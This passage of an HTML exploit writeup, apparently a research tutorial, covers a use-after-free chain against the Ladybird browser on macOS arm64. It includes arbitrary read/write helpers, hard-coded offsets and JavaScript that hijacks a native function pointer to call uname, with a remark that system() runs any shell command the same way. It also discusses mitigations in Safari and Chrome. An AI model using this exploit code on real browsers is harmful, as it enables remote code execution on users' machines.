+    <code>VM[0]</code>. Works, but the <code>VM</code> "vtable" (well, ref-count and early
+    members) is now <code>"uname -a\0…"</code> until we restore it, and any C++ helper that
+    runs before the restore would explode.</li>
+<li><b>Call <code>uname(VM*)</code></b>. <code>uname</code> takes a <code>struct
+    utsname*</code> and writes 5×256 bytes of strings into it. So it writes the answer
+    <em>into the VM object itself</em>, and we read it back with our arb-read.</li>
+</ol>
+
+<p>Option 3 wins because of one beautiful coincidence: after the call, the asm checks
+<code>x1 &amp; 0xff</code> to decide "value or exception?". <code>uname</code> doesn't touch
+<code>x1</code> after its last <code>sysctl</code>, and on Darwin/arm64
+<code>sysctl</code>'s syscall stub leaves <code>x1 = 0</code>. Verified with a 5-line C
+test:</p>
+
+<pre class="out"><code>x1 after uname = 0x0 (low byte = 0x0)
+sysname=Darwin release=25.2.0 machine=arm64</code></pre>
+
+<p>So the asm takes the normal-return path, which only touches <code>VM+15088</code> and
+<code>VM+15152</code>, both well past the 1280 bytes <code>uname</code> clobbered.
+Our very next bytecode ops are <code>r32</code>/<code>w32</code> on <code>rw1</code>/<code>rw2</code>,
+which stay entirely in the asm fast path and never read the damaged region. We copy out the
+strings, restore all 1280 bytes from a saved snapshot, and put
+<code>m_native_function</code> back.</p>
+
+<h3>7.3 Finding the addresses</h3>
+
+<svg viewBox="0 0 800 240">
+ <style>.t{font-size:10.5px}</style>
+ <defs><marker id="a5" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#555"/></marker></defs>
+
+ <rect x="20"  y="20" width="170" height="36" rx="4" fill="#aed6f1" stroke="#1a5276"/>
+ <text x="105" y="34" text-anchor="middle" class="t">r64(addrof(viewA))</text>
+ <text x="105" y="48" text-anchor="middle" class="t">= Uint32Array vtable</text>
+ <line x1="190" y1="38" x2="230" y2="38" stroke="#555" marker-end="url(#a5)"/>
+
+ <rect x="230" y="20" width="170" height="36" rx="4" fill="#d6eaf8" stroke="#1a5276"/>
+ <text x="315" y="34" text-anchor="middle" class="t">− 0x41a330</text>
+ <text x="315" y="48" text-anchor="middle" class="t">= liblagom-js base</text>
+ <line x1="400" y1="38" x2="440" y2="38" stroke="#555" marker-end="url(#a5)"/>
+
+ <rect x="440" y="20" width="170" height="36" rx="4" fill="#d6eaf8" stroke="#1a5276"/>
+ <text x="525" y="34" text-anchor="middle" class="t">r64(base+0x3F0E68)</text>
+ <text x="525" y="48" text-anchor="middle" class="t">= &amp;getenv (GOT)</text>
+ <line x1="610" y1="38" x2="650" y2="38" stroke="#555" marker-end="url(#a5)"/>
+
+ <rect x="650" y="20" width="130" height="36" rx="4" fill="#d5f5e3" stroke="#1e8449"/>
+ <text x="715" y="34" text-anchor="middle" class="t">+0x13258</text>
+ <text x="715" y="48" text-anchor="middle" class="t">= &amp;uname</text>
+
+ <rect x="20"  y="90" width="170" height="36" rx="4" fill="#aed6f1" stroke="#1a5276"/>
+ <text x="105" y="104" text-anchor="middle" class="t">addrof(anyObj) &amp; ~0x3FFF</text>
+ <text x="105" y="118" text-anchor="middle" class="t">= HeapBlock*</text>
+ <line x1="190" y1="108" x2="230" y2="108" stroke="#555" marker-end="url(#a5)"/>
+
+ <rect x="230" y="90" width="170" height="36" rx="4" fill="#d6eaf8" stroke="#1a5276"/>
+ <text x="315" y="104" text-anchor="middle" class="t">r64(HeapBlock+0)</text>
+ <text x="315" y="118" text-anchor="middle" class="t">= &amp;VM.m_heap</text>
+ <line x1="400" y1="108" x2="440" y2="108" stroke="#555" marker-end="url(#a5)"/>
+
+ <rect x="440" y="90" width="170" height="36" rx="4" fill="#d5f5e3" stroke="#1e8449"/>
+ <text x="525" y="104" text-anchor="middle" class="t">− 14704</text>
+ <text x="525" y="118" text-anchor="middle" class="t">= VM*</text>
+
+ <text x="20" y="160" class="t">14704 was found at runtime by scanning backwards from <tspan font-family="var(--mono)">&amp;m_heap</tspan> for a candidate where</text>
+ <text x="20" y="175" class="t"><tspan font-family="var(--mono)">*(cand+0)</tspan> looks like a small refcount, <tspan font-family="var(--mono)">*(cand+15040)</tspan> looks like a small Vector size, and</text>
+ <text x="20" y="190" class="t"><tspan font-family="var(--mono)">*(cand+15088)</tspan> (m_running_execution_context, a known offset) points back into the GC heap. It's stable across</text>
+ <text x="20" y="205" class="t">runs, so it could be hard-coded, but the scan makes the exploit survive minor VM layout churn.</text>
+</svg>
+
+<h3>7.4 The call</h3>
+
+<pre class="js"><code>let vm_save = new Uint32Array(320);
+for (let i=0;i&lt;320;i++) vm_save[i] = r32(VM + BigInt(i*4));   // snapshot VM[0..1279]
+
+w64(addrof(Array.isArray) + 96n, uname_addr);                 // hijack
+Array.isArray(0);                                             // → uname(VM*)
+
+let uts = new Uint32Array(320);
+for (let i=0;i&lt;320;i++) uts[i] = r32(VM + BigInt(i*4));       // read utsname out
+for (let i=0;i&lt;320;i++) w32(VM + BigInt(i*4), vm_save[i]);    // restore VM
+w64(addrof(Array.isArray) + 96n, orig_native);                // un-hijack
+
+print(field(uts,0)+" "+field(uts,256)+" "+field(uts,512)+" "+field(uts,768)+" "+field(uts,1024));</code></pre>
+
+<pre class="out"><code>======== uname -a ========
+Darwin califdev.lan 25.2.0 Darwin Kernel Version 25.2.0: Tue Nov 18 21:09:49 PST 2025;
+root:xnu-12377.61.12~1/RELEASE_ARM64_T8142 arm64
+==========================</code></pre>
+
+<p><code>system</code> is at <code>getenv+0x764B0</code>; swapping it in and writing
+<code>"any shell command\0"</code> at <code>VM[0]</code> works the same way. The 1280-byte
+clobber window is a generous command-line budget.</p>
+
+<!-- ==================================================================== -->
+<h2 id="s8">8. Cleanup and reliability engineering</h2>
+
+<p>Getting from "works once in lldb" to "20/20 in headless mode" was its own project.</p>
+
+<h4>Allocation ordering</h4>
+<p>Every 128 KiB-class allocation must happen either <em>before</em> the UAF or be the
+<code>apply</code> Vector itself. The pair spray, the <code>rw1</code>/<code>rw2</code>
+arrays, the conversion scratch buffer, even a warm-up <code>recv.apply(null, proxy)</code>
+to JIT-compile the trap, all moved above <code>mem.grow()</code>.</p>
+
+<h4>Two scripts, not one</h4>
+<p>Adding stage-2 code to the same <code>&lt;script&gt;</code> grew the top-level
+<code>Executable</code>'s constant table past 128 KiB at <em>parse time</em>, before the
+UAF, but on the next page load X happened to coincide with where that table had been on
+the previous run's heap layout. The symptom was maddening: addrof worked, fakeobj failed
+32/32 retries, and <code>viewA</code> showed a stale <code>INT32(0)</code> at <code>X+8</code>
+from a long-dead Vector. Splitting into two <code>&lt;script&gt;</code> tags (stage 2's
+<code>Executable</code> isn't built until stage 1 has run) fixed it instantly.</p>
+
+<h4>No allocations while holding <code>fake</code></h4>
+<p>Covered in §5.4. In practice this meant rewriting the read/write helpers to take
+<code>(lo, hi)</code> int32 pairs instead of <code>BigInt</code>s, because every BigInt
+arithmetic op allocates a fresh GC cell.</p>
+
+<h4>Post-exploit teardown</h4>
+<p>After printing, the headless harness renders the page and tears down the VM. With
+<code>viewA.m_data</code> still pointing at a long-freed page and
+<code>rw2.m_data</code> pointing at whatever we read last, the destructor chain
+occasionally faulted. Nulling <code>viewA.m_data</code> (forces every future access to the
+slow path, which checks for null) and pointing <code>rw2.m_data</code> back at its own cell
+made teardown clean ≈19/20; the remaining occasional SIGSEGV is after the text dump and
+doesn't affect the result.</p>
+
+<!-- ==================================================================== -->
+<h2 id="s9">9. Graveyard of failed approaches</h2>
+
+<p>These are worth reading because each one teaches something about the constraints.</p>
+
+<div class="deadend"><b>Packed-array element storage as the reclaim target.</b> The
+original researcher's PoC did this and "worked," but only because an <em>intermediate</em>
+growth allocation briefly landed at X and was immediately freed, the data we read was
+leftover, and the live array was elsewhere. The 1.5× growth sequence (8, 12, 18, 27 …
+11623, 17434) never produces a 131072-byte allocation, and <code>a[16382]=x</code> on an
+empty array trips the 200-hole sparse threshold and goes to a HashMap. We tried stepping by
+200, by 201, filling backwards, <code>Array.from</code>, <code>.slice()</code>,
+spread, every path either grows geometrically or goes to dictionary.</div>
+
+<div class="deadend"><b>Leak X from the mimalloc free list.</b> For medium-size blocks
+mimalloc writes a next-pointer at <code>block+0</code> on free. We pre-allocated and
+freed neighbours hoping <code>*(X+0)</code> would point at one. But 128 KiB &gt;
+<code>MI_MEDIUM_OBJ_SIZE_MAX</code> (64 KiB), so it's a <em>large</em> object -
+one per page, no neighbours, next is always NULL. We read <code>0</code> every time.</div>
+
+<div class="deadend"><b>ArrayBuffer overlap to learn X.</b> <code>new
+ArrayBuffer(131072)</code> reliably reclaims X (verified by writing through
+<code>viewA</code> and reading through a fresh view). But that gives us <em>two typed
+arrays viewing the same bytes</em>, no type confusion, no addrof, and we still can't read
+the buffer's address without arb-read. Useful for confirming the bin size; useless for
+progress.</div>
+
+<div class="deadend"><b>Inline-ArrayBuffer fake body.</b> <code>ByteBuffer</code> has 32
+bytes of inline storage, so <code>new ArrayBuffer(32)</code>'s data lives at
+<code>addrof(ab)+64</code>, a known address we can write to! But a fake TypedArray needs
+fields at +10, +68, +92, +104, a 112-byte span. 32 controllable bytes can't cover it, and
+the gaps are vtables and GC headers.</div>
+
+<div class="deadend"><b>Shifted fakeobj on a single cell.</b> Before settling on Δ=16
+across two cells, we tabulated Δ ∈ {−24, −16, −8, +8, +16, +24, +38, +40, +42, +44, +46,
++48, +56, +72} for both the typed-array and packed-array fast paths. Almost every Δ put
+either <code>m_data</code> or <code>array_length</code> on uncontrollable bytes (vtable,
+shape pointer, the wrong half of an address). Δ=16 spanning into the <em>next</em> cell was
+the only fully-constrained solution.</div>
+
+<div class="deadend"><b><code>typeof fake === 'object'</code> as the retry check.</b> The
+forged flags byte is bits 16-23 of the holder's address. When bit 23 happens to be 1, the
+<code>IsFunction</code> flag is set and <code>typeof</code> returns
+<code>"function"</code>. The retry loop spun forever on a perfectly good fake. <code>f !==
+0</code> is the only safe test, strict-equals between mismatched tags is a single asm
+compare with no field reads.</div>
+
+<div class="deadend"><b>Single <code>rw</code> with <code>m_data=4</code>.</b> A
+Uint32Array with length <code>0x7FFFFFFF</code> and base 4 reaches 8 GiB. The GC heap
+(≈5.5 GiB) and dylibs (≈4.3 GiB) are in range; the <code>VM</code> object (≈35 GiB,
+because <code>operator new</code> goes through mimalloc's high arena) is not. Discovered
+when <code>r64(heap_addr)</code> returned the right value but every read past 8 GiB
+silently fell off the fast path and returned <code>undefined</code>.</div>
+
+<div class="deadend"><b>JOP to control <code>x0</code>.</b> At the <code>blr</code> site,
+<code>x5</code> holds the last JS argument and <code>x6</code> points at the argument array
+- both attacker-influenced. A gadget like <code>ldr x0,[x6,#8]; ldr x8,[x6]; blr x8</code>
+would be a universal <code>call(args[0], args[1])</code>. liblagom-js has 931 K
+instructions; the closest matches were <code>mov x0, x5; bl &lt;fixed_fn&gt;</code> (can't
+redirect) and <code>mov x0, x5; ldp x29,x30,[sp]; ret</code> (returns to garbage). With
+<code>uname</code> happy to take <code>VM*</code> directly, we stopped looking.</div>
+
+<!-- ==================================================================== -->
+<h2 id="s10">10. Lessons for systems programmers</h2>
+
+<ul>
+<li><b>Cached raw pointers are liabilities.</b> The bug isn't in the realloc or the grow -
+    it's in the bookkeeping that's supposed to find every cached copy. If you cache a raw
+    pointer across an ownership boundary, the invalidation logic is now part of your memory
+    safety story. Prefer indices, version counters, or recompute on access.</li>
+
+<li><b>Fast paths that skip type checks are confused-deputy machines.</b> The asm
+    interpreter's typed-array path is correct for every real <code>TypedArray</code>. It's
+    also a four-field template that any 112 bytes of memory can satisfy. Once an attacker
+    has <code>fakeobj</code>, every "load field at fixed offset, trust it" sequence is a
+    gadget.</li>
+
+<li><b>Allocator size classes are an exploitation constraint, not an implementation
+    detail.</b> Half this writeup is about getting one allocation into one bin. mimalloc's
+    64 KiB medium/large boundary, the 1.5× array growth factor, the 200-hole sparse
+    threshold, none of those are "security features," but together they very nearly made
+    this unexploitable.</li>
+
+<li><b>Re-entrancy is where overlaps live.</b> The <code>apply</code>+Proxy trick works
+    because spec-mandated user callbacks run <em>while</em> an internal data structure is
+    half-built at a predictable location. Any C++ loop that calls a user-provided function
+    while holding a freshly-malloc'd buffer is a candidate.</li>
+
+<li><b>The exploit is mostly logistics.</b> The actual memory-corruption "moves" are maybe
+    40 lines. The other 200 are: do allocations in the right order, don't hold a poisoned
+    value across a GC, split the script so the bytecode doesn't eat your heap slot, retry
+    when ASLR gives you a bad bit, restore what you clobbered so the page can render. None
+    of that is glamorous and all of it is the difference between a crash PoC and 20/20.</li>
+</ul>
+
+<!-- ==================================================================== -->
+<h2 id="s11">11. Why this exact chain dies on Safari and Chrome</h2>
+
+<p>Everything above worked because Ladybird is, mitigation-wise, roughly where WebKit
+was circa 2015. It's worth mapping each stage onto a modern engine to see which
+defensive layer would have stopped it, because that mapping <em>is</em> the
+curriculum for production browser exploitation: you learn the clean primitive ladder
+first, then you learn one bypass per rung.</p>
+
+<table class="layout" style="font-family:inherit;font-size:0.92em">
+<tr><th>stage</th><th>what we did</th><th>Safari / JavaScriptCore (arm64e)</th><th>Chrome / V8</th></tr>
+<tr>
+  <td>§5</td>
+  <td><code>fakeobj(H+16)</code>: point an object reference 16 bytes into a real
+      cell and let the asm fast path read the wrong fields</td>
+  <td>The JSCell header holds a <b>compressed Structure pointer</b> (an offset into a
+      dedicated Structure heap); fast paths dereference it for the type check before
+      trusting any field. A misaligned cell has garbage in that slot and falls off the
+      fast path. This is a type check rather than a purpose-built anti-forgery layer,
+      so it's softer than the three below; the hard wall at this stage is that the
+      typed-array vector you'd be forging is caged anyway (next row).</td>
+  <td>Object headers carry a <b>compressed Map pointer</b> into read-only space; the
+      type check fails the same way, with the same caveat.</td>
+</tr>
+<tr>
+  <td>§6</td>
+  <td>set <code>rw2.m_data = any 48-bit address</code> and read/write the whole
+      process through a <code>Uint32Array</code></td>
+  <td><b>Gigacage.</b> Typed-array backing pointers are stored as offsets inside a
+      multi-GB reserved region, and every element access masks the effective address
+      back into the cage. Corrupting the field lets you roam the cage, not the
+      process; the GC heap, the GOT and the VM object are all outside it.</td>
+  <td><b>V8 heap sandbox.</b> Backing stores are <i>sandboxed pointers</i> (a 40-bit
+      offset into a 1&nbsp;TB reservation); every external pointer (C++ objects,
+      embedder data, code entry points) is an index into a type-tagged table that
+      lives <i>outside</i> the sandbox. Arb-R/W inside the sandbox cannot reach the
+      table or anything it points at.</td>
+</tr>
+<tr>
+  <td>§7</td>
+  <td><code>w64(addrof(Array.isArray)+96, &amp;uname)</code> then call it; the asm
+      <code>Call</code> path does a raw <code>blr&nbsp;x9</code></td>
+  <td><b>PAC.</b> The WebContent process is built as <code>arm64e</code>. Native
+      entry points are signed (instruction key&nbsp;A, per-slot discriminator) and
+      the call site is <code>blraa</code>. A raw <code>&amp;uname</code> fails
+      authentication and the kernel delivers <code>SIGKILL</code> before the branch.
+      You need a separate signing-oracle primitive to forge it.</td>
+  <td><b>Code pointer table / trusted space.</b> There is no
+      "<code>m_native_function</code>" qword in a writable heap cell. <code>JSFunction
+      → SharedFunctionInfo → Code</code> ends at an index into a code-pointer table
+      that sits in memory the in-sandbox arb-R/W cannot touch. (Chrome on macOS ships
+      as plain <code>arm64</code>, so PAC is not the blocker here; the indirection
+      is.)</td>
+</tr>
+<tr>
+  <td>§7.4</td>
+  <td><code>system("/bin/sh -c …")</code> from the renderer</td>
+  <td colspan="2">Both renderers run under a sandbox profile with no
+      <code>fork</code>/<code>exec</code>/<code>posix_spawn</code>.
+      <code>system()</code> returns <code>-1</code>. Renderer code execution is the
+      <i>start</i> of the chain, not the end; the next step is a broker-IPC or kernel
+      bug.</td>
+</tr>
+</table>
+
+<p>So on a current Safari this chain is stopped three independent times (Gigacage,
+PAC, sandbox) and on current Chrome likewise (heap sandbox, code-pointer indirection,
+sandbox), with the Structure/Map type check as a softer fourth obstacle at the
+<code>fakeobj</code> step. Real-world chains against those engines spend most of their
+length on the bypasses: a Gigacage escape or a Structure-heap leak for JSC, a V8-sandbox escape (corrupting the trusted pointer tables, or a bug in
+<code>Turbofan</code>-emitted code that writes outside the cage) for Chrome, then a
+PAC oracle or a JIT-spray for control flow, then a separate sandbox-escape bug
+entirely.</p>
+
+<p>That layering is exactly why Ladybird is the right place to <em>learn</em> this.
+Each primitive here does what its name says, with nothing in the way, so you can see
+why <code>addrof</code>/<code>fakeobj</code> are the universal currency, why caging
+the typed-array backing store is the single highest-value mitigation, and why a raw
+indirect <code>blr</code> through writable memory is the thing every engine
+eventually stops doing. When you later read a Safari Pwn2Own writeup and it spends
+twenty pages getting <i>around</i> the cage, you'll already know what the cage is
+protecting and what the attacker would do the moment they're past it: precisely the
+ladder in §4-§7.</p>
+
+<p style="text-align:center;color:#888;margin-top:3em">*  *  *<br>
+<small>Exploit: <code>bug1-rce-uname.html</code> · Ladybird release build, macOS arm64</small></p>
+
+</body>
+</html>
